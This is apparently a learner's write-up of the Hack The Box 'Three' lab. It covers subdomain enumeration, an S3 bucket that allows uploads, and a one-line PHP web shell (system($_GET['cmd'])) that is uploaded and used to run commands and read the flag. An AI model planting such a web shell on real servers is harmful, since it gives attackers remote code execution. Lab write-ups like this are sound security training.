# HTB - Three (Tier 1)
**Difficulty:** Very Easy
**OS:** Linux

## Tools Used
- nmap
- gobuster
- aws cli
- Browser

## Steps
1. Connected Kali VM to HTB network via OpenVPN
2. Ran `nmap -sC <IP>` — found port 80 (Apache) open
3. Opened website — found email in Contact section: `mail@thetoppers.htb`
4. Added domain to hosts file
5. Used Gobuster to find subdomains:
   `gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain`
6. Found `s3.thetoppers.htb` — Amazon S3 bucket
7. Added S3 subdomain to hosts file
8. Configured AWS CLI with dummy credentials
9. Listed bucket: `aws --endpoint-url http://s3.thetoppers.htb s3 ls`
10. Checked permissions: bucket allowed file uploads
11. Created PHP shell: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
12. Uploaded shell: `aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`
13. Accessed shell in browser: `http://thetoppers.htb/shell.php?cmd=id`
14. Ran commands to locate flag: `?cmd=ls+-la+/var/www`
15. Read flag: `http://thetoppers.htb/shell.php?cmd=cat+/var/www/flag.txt`

## What I Learned
- Virtual host enumeration finds hidden subdomains
- S3 buckets can be misconfigured to allow public uploads
- Uploading executable files (PHP) to web-accessible directories leads to RCE
- URL encoding: spaces become `+` in query parameters
